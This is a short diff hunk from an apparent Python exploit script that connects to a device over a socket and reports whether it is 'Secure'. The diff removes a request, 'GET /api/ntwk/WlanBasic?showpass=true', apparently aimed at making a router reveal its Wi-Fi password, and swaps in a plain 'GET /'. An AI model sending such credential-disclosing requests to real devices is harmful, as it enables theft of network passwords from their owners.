@@ -52,7 +52,7 @@ except:
 	exit()
 print(f'{good}{bold} Connected ')
 print(f'{good}{bold} Sending the exploit')
-s.send(b'GET /api/ntwk/WlanBasic?showpass=true HTTP/1.1')
+s.send(b'GET / HTTP/1.1')
 try:
 	if s.recv(61561561).decode('utf-8') != '':
 		print(f'{bold}{bad} Secure .!')
